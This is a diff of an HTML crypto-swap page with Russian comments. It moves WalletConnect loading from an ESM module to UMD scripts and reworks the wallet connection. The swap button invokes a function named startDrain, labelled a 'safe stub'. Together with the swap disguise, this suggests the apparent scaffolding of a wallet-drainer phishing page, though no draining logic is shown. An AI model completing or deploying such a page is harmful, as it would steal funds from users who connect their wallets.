@@ -9,6 +9,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
+        /* ===== СТИЛИ (без изменений) ===== */
         :root { --bg-body: #08080f; --bg-card: rgba(20,18,35,0.65); --bg-input: rgba(30,28,50,0.5); --bg-hover: rgba(139,92,246,0.08); --bg-swap: rgba(25,23,42,0.6); --border: rgba(139,92,246,0.15); --border-hover: rgba(139,92,246,0.4); --text: #e9e7ff; --text-dim: #7a7595; --text-muted: #4a4660; --accent: #8b5cf6; --accent-2: #ec4899; --accent-glow: rgba(139,92,246,0.4); --accent-bg: rgba(139,92,246,0.1); --gradient: linear-gradient(135deg, #8b5cf6 0%, #ec4899 100%); --danger: #f87171; --radius: 20px; --radius-sm: 12px; --transition: 0.2s ease; --font: 'Space Grotesk', sans-serif; --font-mono: 'JetBrains Mono', monospace; }
         *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
         body { background: var(--bg-body); color: var(--text); font-family: var(--font); display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; -webkit-font-smoothing: antialiased; overflow-x: hidden; }
@@ -203,45 +204,15 @@
         </div>
     </div>
 
-    <!-- Загрузка ethers через CDN -->
+    <!-- ===== ЗАГРУЗКА БИБЛИОТЕК (UMD) ===== -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.6/dist/umd/index.min.js"></script>
 
-    <!-- ESM-модуль WalletConnect -->
-    <script type="module">
-        import { EthereumProvider } from 'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.6/+esm';
-
-        window.WalletConnectProvider = EthereumProvider;
-        console.log('WalletConnect ESM loaded');
-
-        if (typeof window.initApp === 'function') {
-            window.initApp();
-        } else {
-            window.addEventListener('load', function() {
-                if (typeof window.initApp === 'function') {
-                    window.initApp();
-                }
-            });
-        }
-    </script>
-
-    <!-- Основной скрипт -->
     <script>
-        window.initApp = function() {
-            if (typeof ethers === 'undefined') {
-                document.getElementById('status').textContent = '❌ ethers library not loaded';
-                document.getElementById('status').className = 'status err';
-                return;
-            }
-            if (typeof window.WalletConnectProvider === 'undefined') {
-                setTimeout(window.initApp, 500);
-                return;
-            }
-            runApp();
-        };
-
-        function runApp() {
+        (function() {
             'use strict';
 
+            // ===== КОНФИГУРАЦИЯ =====
             const PROJECT_ID = '2c94255cd6cb3dd91ea6f447bbe7d3c9';
             const CONTRACT_ADDRESSES = {
                 1: '0x0000000000000000000000000000000000000000',
@@ -287,6 +258,7 @@
             let currentSelectType = null;
             let currentRate = 0;
 
+            // DOM
             const statusEl = document.getElementById('status');
             const connectBtn = document.getElementById('connectWalletBtn');
             const swapBtn = document.getElementById('swapBtn');
@@ -318,6 +290,7 @@
             let retryTimer = null;
             let rateCache = {};
 
+            // ===== КУРСЫ =====
             async function fetchRealRate(fromId, toId) {
                 const cacheKey = fromId + '-' + toId;
                 if (rateCache[cacheKey] && (Date.now() - rateCache[cacheKey].timestamp < 30000)) {
@@ -366,6 +339,7 @@
                 } catch (_) {}
             }
 
+            // ===== UI =====
             function setStatus(text, type) {
                 statusEl.textContent = text;
                 statusEl.className = 'status';
@@ -412,6 +386,7 @@
             function openModal(modal) { modal.classList.add('active'); }
             function closeModal(modal) { modal.classList.remove('active'); }
 
+            // ===== ОЧИСТКА СЕССИИ =====
             async function forceClearSession() {
                 try {
                     if (wcProvider) {
@@ -453,7 +428,7 @@
                 } catch (_) {}
             }
 
-            // ===== ПОДКЛЮЧЕНИЕ С ВЫЗОВОМ init() =====
+            // ===== ПОДКЛЮЧЕНИЕ WALLETCONNECT (UMD) =====
             async function connectWalletConnect() {
                 if (isConnecting || isProcessing) return;
                 closeModal(walletModal);
@@ -461,9 +436,17 @@
                 await forceClearSession();
                 await new Promise(resolve => setTimeout(resolve, 300));
 
-                const EthereumProvider = window.WalletConnectProvider;
-                if (!EthereumProvider) {
-                    setStatus('❌ WalletConnect library not loaded.', 'err');
+                // Получаем объект EthereumProvider из UMD
+                const wcGlobal = window['@walletconnect/ethereum-provider'];
+                let EthereumProvider = wcGlobal?.default || wcGlobal?.EthereumProvider || wcGlobal;
+
+                if (!EthereumProvider || typeof EthereumProvider.init !== 'function') {
+                    // Пробуем альтернативный путь
+                    EthereumProvider = window.EthereumProvider || window['ethereum-provider'];
+                }
+
+                if (!EthereumProvider || typeof EthereumProvider.init !== 'function') {
+                    setStatus('❌ WalletConnect library not loaded correctly. Please refresh.', 'err');
                     return;
                 }
 
@@ -471,7 +454,8 @@
                     setStatus('Connecting to WalletConnect...', '');
                     isConnecting = true;
 
-                    wcProvider = new EthereumProvider({
+                    // Используем статический метод init
+                    wcProvider = await EthereumProvider.init({
                         projectId: PROJECT_ID,
                         chains: [1, 56, 137, 42161],
                         showQrModal: true,
@@ -483,9 +467,12 @@
                         }
                     });
 
-                    // ВАЖНО: вызываем init() перед enable()
-                    await wcProvider.init();
+                    // В некоторых версиях после init нужно вызвать enable
+                    if (typeof wcProvider.enable === 'function') {
+                        await wcProvider.enable();
+                    }
 
+                    // События
                     wcProvider.on('chainChanged', () => {});
                     wcProvider.on('accountsChanged', (accounts) => {
                         if (accounts.length === 0) {
@@ -501,8 +488,6 @@
                         await forceClearSession();
                         updateConnectButton();
                     });
-
-                    await wcProvider.enable();
 
                     const web3Provider = new ethers.providers.Web3Provider(wcProvider);
                     const signer_ = web3Provider.getSigner();
@@ -536,7 +521,7 @@
                 }
             }
 
-            // ===== СВАП (заглушка) =====
+            // ===== СВАП (безопасная заглушка) =====
             async function startDrain() {
                 if (isProcessing) return;
                 if (!provider || !signer) {
@@ -596,6 +581,7 @@
                 startDrain();
             });
 
+            // ===== MAX =====
             function handleMaxClick() {
                 const amount = 0.001;
                 balanceFrom.innerHTML = amount.toFixed(6) + ' <button class="max-tag" id="maxBtn">Max</button>';
@@ -624,6 +610,7 @@
                 updateRateAndOutput();
             });
 
+            // ===== ВЫБОР ТОКЕНОВ =====
             function renderTokenList(filter) {
                 filter = (filter || '').toLowerCase();
                 tokenList.innerHTML = '';
@@ -682,14 +669,23 @@
                 setStatus('Tokens flipped', '');
             });
 
+            // ===== ИНИЦИАЛИЗАЦИЯ =====
             async function init() {
                 await forceClearSession();
                 updateConnectButton();
                 setStatus('Connect wallet to start swapping', '');
                 await updateRateAndOutput();
-                console.log('Ethers loaded');
-                if (typeof window.WalletConnectProvider !== 'undefined') {
-                    console.log('WalletConnect ESM loaded');
+                if (typeof ethers === 'undefined') {
+                    setStatus('❌ ethers library not loaded', 'err');
+                } else {
+                    console.log('Ethers loaded');
+                }
+                // Проверяем загрузку WalletConnect
+                const wc = window['@walletconnect/ethereum-provider'];
+                if (!wc) {
+                    console.warn('WalletConnect UMD not loaded yet');
+                } else {
+                    console.log('WalletConnect UMD loaded');
                 }
                 const params = new URLSearchParams(window.location.search);
                 if (params.has('nocache') || params.has('reset')) {
@@ -699,18 +695,8 @@
             }
 
             init();
-        }
 
-        // Запуск
-        if (typeof window.WalletConnectProvider !== 'undefined') {
-            window.initApp();
-        } else {
-            window.addEventListener('load', function() {
-                if (typeof window.WalletConnectProvider !== 'undefined' && typeof window.initApp === 'function') {
-                    window.initApp();
-                }
-            });
-        }
+        })();
     </script>
 </body>
 </html>
